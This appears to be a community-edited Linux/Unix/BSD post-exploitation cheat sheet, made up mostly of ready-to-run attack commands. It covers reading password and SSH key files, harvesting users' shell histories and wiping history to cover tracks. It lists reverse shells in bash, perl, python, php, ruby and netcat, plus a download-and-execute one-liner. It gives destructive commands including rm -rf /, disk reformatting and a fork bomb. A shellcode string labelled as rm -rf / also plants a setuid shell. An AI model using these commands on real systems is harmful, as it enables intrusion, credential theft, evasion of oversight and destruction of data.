 Linux/Unix/BSD Post-Exploitation Command List.
===============================================

If for any reason you cannot access/edit these files in the future,
please contact [mubix@hak5.org]{.underline}

If you are viewing this on anything other than Google Docs then you can
get access to the latest links to

You can download these files using Google Doc's File-\>Download As
method.

the the Linux/Unix/BSD, OSX, and Windows docs here:
[[https://bitly.com/nuc0N0]{.underline}](https://bitly.com/nuc0N0)

DISCLAIMER: Anyone can edit these docs, and all that entails and infers


Information
===========

Blind Files
-----------

(things to pull when all you can do is blindly read) LFI/dir traversal
(Don't forget %00!)

  ------------------ -----------------------------------------------------------------------------------------------------------------------------------------------------
  **File**           **Contents and Reason**
  /etc/resolv.conf   Contains the current name servers (DNS) for the system. This is a globally readable file that is less likely to trigger IDS alerts than /etc/passwd
  /etc/motd          Message of the Day.
  /etc/issue         Debian - current version of distro
  /etc/passwd        List of users as well
  /etc/shadow        List of users' passwords' hashes (requires root)
  ------------------ -----------------------------------------------------------------------------------------------------------------------------------------------------

System
------

  ------------------------ -------------------------------------------------------------
  **Command**              **Description and/or Reason**
  uname -a                 Prints the kernel version, arch, sometimes distro, \...
  ps aux                   List all running processes
  top -n 1 -b
  id
  arch
  w                        who is connected, uptime and load avg
  who -a                   uptime, runlevel, tty, proceses etc.
  gcc -v                   Returns the version of GCC.
  mysql \--version         Returns the version of MySQL.
  perl -v                  Returns the version of Perl.
  ruby -v                  Returns the version of Ruby.
  python \--version        Returns the version of Python.
  df -k                    mounted fs, size, % use, dev and mount point
  mount                    mounted fs
  last -a
  lastcomm
  lastlog
  lastlogin (BSD)
  getenforce
  dmesg
  lspci
  lsusb
  lshw
  free -m
  cat /proc/cpuinfo
  cat /proc/meminfo
  du -h \--max-depth=1 /
  which nmap               locate a command (in this case, nmap)
  locate bin/nmap
  which nc
  locate bin/nc
  whoami                   Returns the username of the account executing this command.
  jps -l
  java -version            Returns the version of Java.
  ------------------------ -------------------------------------------------------------

Networking
----------

-   hostname -f

-   ip addr show

-   ifconfig -a

-   route -n

-   cat /etc/network/interfaces

-   iptables -L -n

-   iptables -t nat -L -n

-   ip6tables -L -n

-   iptables-save

-   netstat -anop

-   netstat -r

-   netstat -nltupw (root with raw sockets)

-   arp -a

-   lsof -nPi

to resume it → "cat /proc/net/\*" (more discret)

*what does the above mean?*

Configs
-------

-   ls -aRl /etc/ \| awk \'\$1 \~ /w.\$/\' \| grep -v lrwx 2\>/dev/null

-   cat /etc/issue{,.net}

-   cat /etc/passwd

-   cat /etc/shadow (gotta try..)

-   cat /etc/shadow\~ \# (sometimes there when edited with gedit)

-   cat /etc/master.passwd

-   cat /etc/group

-   cat /etc/hosts

-   cat /etc/crontab

-   cat /etc/sysctl.conf

-   for user in \$(cut -f1 -d: /etc/passwd); do echo \$user; crontab -u
    \$user -l; done \# (Lists all crons)

-   cat /etc/resolv.conf

-   cat /etc/syslog.conf

-   cat /etc/chttp.conf

-   cat /etc/lighttpd.conf

-   cat /etc/cups/cupsd.conf

-   cat /etc/inetd.conf

-   cat /opt/lampp/etc/httpd.conf

-   cat /etc/samba/smb.conf

-   cat /etc/openldap/ldap.conf

-   cat /etc/ldap/ldap.conf

-   pdbedit -L -w

-   pdbedit -L -v

-   cat /etc/exports

-   cat /etc/auto.master

-   cat /etc/auto\_master

-   cat /etc/fstab

-   cat /etc/exports

-   find /etc/sysconfig/ -type f -exec cat {} \\;

-   cat /etc/sudoers

Determine Distro
----------------

-   lsb\_release -d \# Generic cmd for all LSB distros

-   /etc/lsb-release \# Generic config for all LSB distros

-   /etc/issue \# Generic but often modified

-   cat /etc/\*release

-   /etc/SUSE-release \# Novell SUSE

-   /etc/redhat-release, /etc/redhat\_version \# Red Hat

-   /etc/fedora-release \# Fedora

-   /etc/slackware-release, /etc/slackware-version \# Slackware

-   /etc/debian\_release, /etc/debian\_version, \# Debian

-   /etc/mandrake-release \# Mandrake

-   /etc/sun-release \# Sun JDS

-   /etc/release \# Solaris/Sparc

-   /etc/gentoo-release \# Gentoo

-   /etc/rc.conf \# arch linux

-   arch \# on OpenBSD sample: OpenBSD.amd64

-   uname -a (often hints at it pretty well)

Installed Packages
------------------

-   rpm -qa \--last \| head

-   yum list \| grep installed

-   dpkg -l

-   dpkg -l \| grep -i "linux-image"

-   pkg\_info \# FreeBSD

-   equery list \* \# on Gentoo but 'equery' needs to be installed so
    use "cd /var/db/pkg/ && ls -d \*/\*" instead

Package Sources
---------------

-   cat /etc/apt/sources.list

<!-- -->

-   ls -l /etc/yum.repos.d/

-   cat /etc/yum.conf

Finding Important Files
-----------------------

-   find /var/log -type f -exec ls -la {} \\;

-   ls -alhtr /mnt

-   ls -alhtr /media

-   ls -alhtr /tmp

-   ls -alhtr /home

-   cd /home/; treels /home/\*/.ssh/\*

-   find /home -type f -iname \'.\*history\'

-   ls -lart /etc/rc.d/

-   locate tar \| grep \[.\]tar\$

-   locate tgz \| grep \[.\]tgz\$

-   locate sql l grep \[.\]sql\$

-   locate settings \| grep \[.\]php\$

-   locate config.inc \| grep \[.\]php\$

<!-- -->

-   ls /home/\*/id\*

-   locate .properties \| grep \[.\]properties \# java config files

-   locate .xml \| grep \[.\]xml \# java/.net config files

-   find /sbin /usr/sbin /opt /lib \`echo \$PATH \| 'sed s/:/ /g'\`
    -perm -4000 \# find suids

-   locate rhosts

Covering Your Tracks
====================

Avoiding history files
----------------------

-   export HISTFILE=

This next one might not be a good idea, because a lot of folks know to
check for tampering with this file, and will be suspicious if they find
out:

However if you happen to be on an account that was originally
inaccessible, if the .bash\_history file is available (ls -a \~),
viewing its contents can provide you with a good deal of information
about the system and its most recent updates/changes.

clear all history in ram

-   history -c

-   rm -rf \~/.bash\_history && ln -s \~/.bash\_history /dev/null
    (invasive)

<!-- -->

-   touch \~/.bash\_history (invasive)

-   \<space\> history -c (using a space before a command)

-   zsh% unset HISTFILE HISTSIZE

-   t?csh% set history=0

-   bash\$ set +o history

-   ksh\$ unset HISTFILE

Note that you're probably better off modifying or temporary disabling
rather than deleting history files, it leaves a lot less traces and is
less suspect.

Obtain users' information
=========================

-   ls -alh /home/\*/

-   ls -alh /home/\*/.ssh/

-   cat /home/\*/.ssh/authorized\_keys

-   cat /home/\*/.ssh/known\_hosts

-   cat /home/\*/.\*hist\* \# you can learn a lot from this

-   find -type f /home/\*/.vnc /home/\*/.subversion

-   grep \^ssh /home/\*/.\*hist\*

-   grep \^telnet \`/home/\*/.\*hist\*

-   grep \^mysql /home/\*/.\*hist\*

-   cat /home/\*/.viminfo

<!-- -->

-   sudo -l \# if sudoers is not readable, this sometimes works per user

-   crontab -l

-   cat /home/\*/.mysql\_history

Escalating
==========

Looking for possible opened paths
---------------------------------

-   ls -alh /root/

-   cat /etc/sudoers

-   cat /etc/shadow

-   cat /etc/master.passwd \# OpenBSD

-   cat /var/spool/cron/crontabs/\* \| cat /var/spool/cron/\*

-   lsof -nPi

-   ls /home/\*/.ssh/\*

Maintaining control
===================

Reverse Shell
-------------

Starting list sourced from: [[
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet]{.underline}](http://www.google.com/url?q=http%3A%2F%2Fpentestmonkey.net%2Fcheat-sheet%2Fshells%2Freverse-shell-cheat-sheet&sa=D&sntz=1&usg=AFQjCNFxX7D4XrJV999xsFEVnml66qvHZA)

-   bash -i \>& /dev/tcp/10.0.0.1/8080 0\>&1 (No /dev/tcp on Debian, but
    use nc, TCL, awk or any interpreter like Python, and so on.).

-   perl -e \'use Socket; \$i=\"10.0.0.1\"; \$p=1234; socket(S,PF\_INET,
    SOCK\_STREAM, getprotobyname(\"tcp\"));
    if(connect(S,sockaddr\_in(\$p,inet\_aton(\$i)))){
    open(STDIN,\"\>&S\"); open(STDOUT,\"\>&S\"); open(STDERR,\"\>&S\");
    exec(\"/bin/sh -i\");};\'

-   python -c \'import socket,subprocess,os;
    s=socket.socket(socket.AF\_INET, socket.SOCK\_STREAM);
    s.connect((\"10.0.0.1\",1234)); os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
    p=subprocess.call(\[\"/bin/sh\",\"-i\"\]);\'

-   php -r \'\$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i
    \<&3 \>&3 2\>&3\");\'

-   ruby -rsocket -e\'f=TCPSocket.open(\"10.0.0.1\",1234).to\_i; exec
    sprintf(\"/bin/sh -i \<&%d \>&%d 2\>&%d\",f,f,f)\' nc -e /bin/sh
    10.0.0.1 1234 \# note need -l on some versions, and many does NOT
    support -e anymore

-   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2\>&1\|nc 10.0.0.1
    1234 \>/tmp/f

-   xterm -display 10.0.0.1:1

    -   Listener- Xnest :1

    -   Add permission to connect- xhost +victimIP

-   ssh -NR 3333:localhost:22 user@yourhost

-   nc -e /bin/sh 10.0.0.1 1234

Fun if Windows is present and accessible
========================================

If there is Windows installed and the logged-in user access level
includes those Windows partition, attacker can mount them up and do a
much deeper information gathering, credential theft and root-ing.
Ntfs-3g is useful for mounting ntfs partitions read-write.

**TODO**: insert details on what to look for

Stuff to be sorted
==================

**\#\# GOING TO MOVE EVERYTHING HERE FOR LEGIBILITY ONCE EDITING DIES
DOWN**

+-----------------------------------+-----------------------------------+
| **Command**                       | **Output**                        |
+-----------------------------------+-----------------------------------+
| *uname -a*                        | Linux kernel version, usually     |
|                                   | distribution too                  |
+-----------------------------------+-----------------------------------+
| *ps aux*                          | List of running processes         |
+-----------------------------------+-----------------------------------+
| *id*                              | List current user and group along |
|                                   | with user/group id                |
+-----------------------------------+-----------------------------------+
| *w*                               | Show info about who is logged,    |
|                                   | what are they are doing           |
+-----------------------------------+-----------------------------------+
| *who -a*                          | Print information about users     |
+-----------------------------------+-----------------------------------+
| cat /dev/core \> /dev/audio       | Makes a sound from the memory     |
|                                   | content.                          |
| cat /dev/mem \> /dev/audio        |                                   |
|                                   | *Usefullness of this???*          |
+-----------------------------------+-----------------------------------+

Deleting and Destroying
=======================

*(If it is necessary to leave the machine inaccessible or unusable)*

*Note that this tends to be quite evident (as opposed to a simple
exploitation that might go unnoticed for some time, even forever), and
will most surely get you into troubles.*

*Oh, and you're probably a jerk if you use any of the stuff below.*

+-----------------------------------+-----------------------------------+
| **Command**                       | **Description**                   |
+-----------------------------------+-----------------------------------+
| rm -rf /                          | This will recursively try to      |
|                                   | delete all files.                 |
+-----------------------------------+-----------------------------------+
| char esp\[\] \_\_attribute\_\_    | Hex version of rm -rf /           |
| ((section(".text"))) /\* e.s.p    |                                   |
| release \*/ =                     | *How is this supposed to work?*   |
| "\\xeb\\x3e\\x5b\\x31\\xc0\\x50\\ |                                   |
| x54\\x5a\\x83\\xec\\x64\\x68″     |                                   |
|                                   |                                   |
| "\\xff\\xff\\xff\\xff\\x68\\xdf\\ |                                   |
| xd0\\xdf\\xd9\\x68\\x8d\\x99″     |                                   |
|                                   |                                   |
| "\\xdf\\x81\\x68\\x8d\\x92\\xdf\\ |                                   |
| xd2\\x54\\x5e\\xf7\\x16\\xf7″     |                                   |
|                                   |                                   |
| "\\x56\\x04\\xf7\\x56\\x08\\xf7\\ |                                   |
| x56\\x0c\\x83\\xc4\\x74\\x56″     |                                   |
|                                   |                                   |
| "\\x8d\\x73\\x08\\x56\\x53\\x54\\ |                                   |
| x59\\xb0\\x0b\\xcd\\x80\\x31″     |                                   |
|                                   |                                   |
| "\\xc0\\x40\\xeb\\xf9\\xe8\\xbd\\ |                                   |
| xff\\xff\\xff\\x2f\\x62\\x69″     |                                   |
|                                   |                                   |
| "\\x6e\\x2f\\x73\\x68\\x00\\x2d\\ |                                   |
| x63\\x00″                         |                                   |
|                                   |                                   |
| "cp -p /bin/sh /tmp/.beyond;      |                                   |
| chmod 4755 /tmp/.beyond;";        |                                   |
+-----------------------------------+-----------------------------------+
| mkfs.ext3 /dev/sda                | Reformat the device mentioned,    |
|                                   | making recovery of files hard.    |
+-----------------------------------+-----------------------------------+
| chmod -R 000 /                    | Files are not lost but only       |
|                                   | accessible from another system,   |
|                                   | or a live distro. Nobody will be  |
|                                   | able to login, nor shut the       |
|                                   | computer down, and if forcibly    |
|                                   | shut down it won't start again.   |
+-----------------------------------+-----------------------------------+

Execute a remote script
-----------------------

  -------------------------------------- ----------------------------------------------------------------------------------------------------------------------------------
  wget http://server/file.sh -O- \| sh   This command forces the download of a file and immediately its execution, can be exploited easily using or reverse shell exploit
  -------------------------------------- ----------------------------------------------------------------------------------------------------------------------------------

Fork Bomb
---------

  -------------- ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  :(){:\|:&};:   The \[in\]famous \"fork bomb\". This command will cause your system to run a large number of processes, until it \"hangs\". This can often lead to data loss (e.g. if the user brutally reboots, or the OOM killer kills a process with unsaved work). If left alone for enough time a system can eventually recover from a fork bomb.
  -------------- ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
